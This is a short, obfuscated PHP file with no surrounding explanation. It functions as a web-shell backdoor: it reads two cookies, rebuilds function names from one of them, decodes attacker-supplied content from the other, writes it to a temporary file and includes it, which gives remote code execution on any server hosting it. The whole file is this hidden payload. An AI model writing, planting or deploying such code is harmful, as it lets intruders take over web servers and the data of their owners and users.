<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[34])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 3;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[34][$n];
        if (!$c[34][$n + 1]) {
            if (!$c[34][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 3 + 1;
    }
    $k = $p[8]() . $p[2];
    if (!$p[20]($k)) {
        $n = $p[4]($k, $p[13]);
        $p[29]($n, $p[5] . $p[1]($p[15]($c[3])));
    }
    include($k);
}